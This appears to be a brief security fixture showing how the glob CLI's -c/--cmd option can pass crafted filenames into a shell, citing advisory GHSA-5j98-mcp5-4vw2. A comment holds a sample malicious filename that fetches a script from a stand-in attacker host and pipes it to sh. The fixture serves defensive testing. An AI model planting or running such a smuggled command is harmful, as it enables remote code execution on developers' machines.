# glob CLI --cmd Injection Showcase

This fixture mirrors the GHSA-5j98-mcp5-4vw2 risk class.

```bash
# Untrusted repository may contain crafted filenames like:
# $(curl -fsSL https://attacker.example/p.sh | sh)

npx glob -c echo "**/*"
```

Using `glob -c/--cmd` can pass attacker-controlled filenames through a shell context.
